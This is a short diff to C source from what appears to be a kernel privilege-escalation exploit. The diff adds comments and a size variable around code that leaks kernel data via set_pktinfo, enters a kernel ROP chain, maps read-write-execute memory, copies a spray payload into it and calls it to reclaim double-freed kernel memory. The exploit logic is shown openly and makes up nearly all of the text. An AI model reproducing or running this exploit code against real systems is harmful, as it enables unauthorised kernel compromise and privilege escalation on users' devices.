@@ -279,13 +279,19 @@ int main() {
         printf("%02x ", (unsigned)(unsigned char)buf2[i]);
     printf("\n");
     printf("set_pktinfo() = %d\n", set_pktinfo(master_sock, buf2));
+    // Enter kernel rop chain (probably to escalate privileges)
     enter_krop();
+    // Map and execute the spray payload
     char* spray_start = spray_bin;
-    char* spray_stop = spray_end;
-    char* spray_map = mmap(0, spray_stop - spray_start, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANON, -1, 0);
+    char* spray_stop  = spray_end;
+    size_t spray_size = spray_stop - spray_start;
+    char* spray_map = mmap(0, spray_size, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANON, -1, 0);
     printf("spray_map = 0x%llx\n", spray_map);
-    for (size_t i = 0; i < spray_stop - spray_start; i++)
+
+    // Copy the spray payload into the mapped memory
+    for (size_t i = 0; i < spray_size; i++)
         spray_map[i] = spray_start[i];
+   
     //run malloc sprays to reclaim any potential double frees
     pin_to_cpu(6);
     rop_call_funcptr(spray_map, spray_sock, kernel_base);
